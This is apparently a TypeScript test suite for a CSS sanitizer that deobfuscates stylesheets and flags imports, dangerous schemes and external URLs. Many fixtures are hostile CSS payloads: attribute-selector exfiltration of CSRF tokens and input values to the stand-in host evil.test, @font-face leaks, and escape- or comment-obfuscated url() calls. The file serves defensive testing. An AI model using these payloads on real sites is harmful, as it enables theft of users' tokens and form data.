import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import {
  auditCss,
  evaluateUrl,
  findSensitiveAttributeSelectors,
  normalizeCss,
  parseCss,
  tokenizeCss,
} from '../src/css.ts';

const codes = (result: ReturnType<typeof auditCss>): string[] =>
  result.findings.map((finding) => finding.code);

const ALLOWED = { allowedHosts: ['cdn.example.com', '.assets.example.com'] };

describe('CSS normalization / deobfuscation', () => {
  it('decodes backslash unicode escapes like \\75 rl(', () => {
    const { text } = normalizeCss('\\75 rl(');
    assert.equal(text, 'url(');
  });

  it('decodes long hex escapes without trailing whitespace', () => {
    const { text } = normalizeCss('\\000075rl(');
    assert.equal(text, 'url(');
  });

  it('removes comments including comment-split keywords', () => {
    const { text } = normalizeCss('ur/**/l("https://evil.test/x")');
    assert.equal(text, 'url("https://evil.test/x")');
  });

  it('removes backslash newline line continuations', () => {
    const { text } = normalizeCss('u\\\nrl(');
    assert.equal(text, 'url(');
    const crlf = normalizeCss('u\\\r\nrl(');
    assert.equal(crlf.text, 'url(');
  });

  it('handles combined comment + escape obfuscation', () => {
    const payload =
      '@im\\70 ort /**/ url("https://evil.test/steal.css");';
    const { text } = normalizeCss(payload);
    assert.match(text, /@import/);
    assert.match(text, /url\("https:\/\/evil\.test/);
  });

  it('preserves an offset mapping back to the original source', () => {
    const original = 'a{ color:red; }  \\75 rl()';
    const { text, map } = normalizeCss(original);
    const normalizedIndex = text.indexOf('url(');
    assert.ok(normalizedIndex >= 0);
    assert.equal(original[map[normalizedIndex]], '\\');
  });
});

describe('CSS tokenizer / parser', () => {
  it('tokenizes functions, strings and brackets', () => {
    const tokens = tokenizeCss('input[value^="a"] { background: url("/x.png"); }');
    const types = tokens.map((token) => token.type);
    assert.ok(types.includes('function'));
    assert.ok(types.includes('string'));
    assert.ok(types.includes('bracket'));
  });

  it('parses qualified rules with declarations', () => {
    const sheet = parseCss(
      'a { color: red; background: url("https://x.test/y.png"); }',
    );
    assert.equal(sheet.rules.length, 1);
    assert.equal(sheet.rules[0].type, 'qualified');
    assert.equal(sheet.rules[0].declarations[0].property, 'color');
    assert.match(sheet.rules[0].declarations[1].value, /url/);
  });

  it('parses nested @media rules and @font-face', () => {
    const sheet = parseCss(
      '@media screen { .a { color: red } } @font-face { font-family: x; src: url(/f.woff2); }',
    );
    assert.equal(sheet.rules[0].atName, 'media');
    assert.equal(sheet.rules[0].rules[0].declarations[0].property, 'color');
    assert.equal(sheet.rules[1].atName, 'font-face');
    assert.equal(sheet.rules[1].declarations[0].property, 'font-family');
  });
});

describe('Hard blocks', () => {
  it('blocks @import in plain and string form', () => {
    assert.equal(auditCss('@import url("https://evil.test/x.css");').allowed, false);
    const stringForm = auditCss('@import "https://evil.test/x.css";');
    assert.ok(codes(stringForm).includes('AT_IMPORT'));
  });

  it('blocks expression() including escaped forms', () => {
    const result = auditCss('width: expr\\65 ssion(alert(1));');
    assert.ok(codes(result).includes('CSS_EXPRESSION'));
  });

  it('blocks -moz-binding', () => {
    const result = auditCss(
      '-moz-binding: url("https://evil.test/xbl.xml#x");',
    );
    assert.ok(codes(result).includes('MOZ_BINDING'));
  });

  it('blocks javascript: and vbscript: url schemes', () => {
    const result = auditCss('background: url("javascript:alert(1)");');
    assert.ok(codes(result).includes('DANGEROUS_SCHEME'));
  });

  it('blocks external url() not on the allowlist', () => {
    const result = auditCss(
      'body { background: url("https://evil.test/bg.png"); }',
      ALLOWED,
    );
    assert.ok(codes(result).includes('EXTERNAL_URL'));
    assert.equal(result.allowed, false);
  });

  it('allows relative and allowlisted hosts', () => {
    const relative = auditCss('body { background: url("/img/bg.png"); }', ALLOWED);
    assert.equal(relative.allowed, true);
    const allowed = auditCss(
      'body { background: url("https://cdn.example.com/bg.png"); }',
      ALLOWED,
    );
    assert.equal(allowed.allowed, true);
    const subdomain = auditCss(
      'body { background: url("https://static.assets.example.com/bg.png"); }',
      ALLOWED,
    );
    assert.equal(subdomain.allowed, true);
  });

  it('catches unicode-escape url() exfiltration payloads', () => {
    // \75 rl( -> url(  ; \68 ttps -> https
    const payload =
      'background:\\75 rl("\\68 ttps://evil.test/leak?d=x");';
    const result = auditCss(payload, ALLOWED);
    assert.ok(
      codes(result).includes('EXTERNAL_URL'),
      `expected EXTERNAL_URL, got ${codes(result).join(',')}`,
    );
  });

  it('catches comment-split and newline-split url() obfuscation', () => {
    const commentSplit = auditCss(
      'background: ur/**/l("https://evil.test/x");',
      ALLOWED,
    );
    assert.ok(codes(commentSplit).includes('EXTERNAL_URL'));

    const newlineSplit = auditCss('background: u\\\nrl("https://evil.test/x");', ALLOWED);
    assert.ok(codes(newlineSplit).includes('EXTERNAL_URL'));
  });

  it('optionally blocks data: URLs', () => {
    const defaultAllowed = auditCss('background: url("data:image/png;base64,AAAA");');
    assert.equal(defaultAllowed.allowed, true);
    const blocked = auditCss('background: url("data:image/png;base64,AAAA");', {
      blockDataUrls: true,
    });
    assert.ok(
      codes(blocked).includes('DATA_URL_BLOCKED') ||
        codes(blocked).includes('DANGEROUS_SCHEME'),
    );
    assert.equal(blocked.allowed, false);
  });
});

describe('URL evaluation', () => {
  it('classifies relative, allowed and blocked URLs', () => {
    assert.equal(evaluateUrl('/same-origin', ALLOWED).verdict, 'relative');
    assert.equal(
      evaluateUrl('https://cdn.example.com/a', ALLOWED).verdict,
      'external-allowed',
    );
    assert.equal(
      evaluateUrl('https://evil.test/a', ALLOWED).verdict,
      'external-blocked',
    );
    assert.equal(
      evaluateUrl('javascript:alert(1)', ALLOWED).verdict,
      'blocked-scheme',
    );
  });
});

describe('CSS exfiltration via attribute selectors', () => {
  it('detects sensitive attribute selectors', () => {
    const hits = findSensitiveAttributeSelectors(
      'input[name*="csrf"][value^="a"]',
      ['value', 'name'],
    );
    assert.equal(hits.length, 2);
    assert.deepEqual(
      hits.map((hit) => hit.attribute).sort(),
      ['name', 'value'],
    );
  });

  it('blocks [value^=...] selector paired with external url()', () => {
    const payload =
      'input[value^="a"] { background: url("https://evil.test/leak?a"); }';
    const result = auditCss(payload, ALLOWED);
    assert.ok(codes(result).includes('ATTRIBUTE_EXFIL'));
    assert.ok(codes(result).includes('EXTERNAL_URL'));
  });

  it('blocks [name*=token] token-stealing selector chains', () => {
    const payload =
      'input[name*="token"][value^="Z"] { background: url("https://evil.test/Z"); }';
    const result = auditCss(payload, ALLOWED);
    assert.ok(
      codes(result).includes('ATTRIBUTE_EXFIL'),
      `got ${codes(result).join(',')}`,
    );
  });

  it('catches obfuscated attribute exfiltration payloads', () => {
    // Escaped "u" inside url() and comment splitting inside the selector.
    const payload =
      'input[val/**/ue^="a"] { background: \\75 rl("https://evil.test/leak"); }';
    const result = auditCss(payload, ALLOWED);
    assert.ok(
      codes(result).includes('ATTRIBUTE_EXFIL'),
      `got ${codes(result).join(',')}`,
    );
  });

  it('correlates sensitive selectors with external @font-face src', () => {
    const payload = [
      '@font-face { font-family: "x"; src: url("https://evil.test/f.woff2"); }',
      'input[value^="a"] { font-family: "x"; }',
    ].join(' ');
    const result = auditCss(payload, ALLOWED);
    assert.ok(codes(result).includes('FONT_FACE_EXFIL'));
    assert.ok(codes(result).includes('ATTRIBUTE_EXFIL'));
  });

  it('does not flag same-origin attribute-selector styling', () => {
    const payload =
      'input[name="csrf"][value^="a"] { background: url("/img/a.png"); }';
    const result = auditCss(payload, ALLOWED);
    assert.equal(result.allowed, true);
  });

  it('supports custom sensitive attribute names', () => {
    const payload =
      '[data-account^="x"] { background: url("https://evil.test/x"); }';
    const defaultResult = auditCss(payload, ALLOWED);
    assert.ok(!codes(defaultResult).includes('ATTRIBUTE_EXFIL'));
    const custom = auditCss(payload, {
      ...ALLOWED,
      sensitiveAttributes: ['data-account'],
    });
    assert.ok(codes(custom).includes('ATTRIBUTE_EXFIL'));
  });

  it('detects exfiltration inside @media nested rules', () => {
    const payload =
      '@media screen { input[value^="a"] { background: url("https://evil.test/m"); } }';
    const result = auditCss(payload, ALLOWED);
    assert.ok(codes(result).includes('ATTRIBUTE_EXFIL'));
  });
});
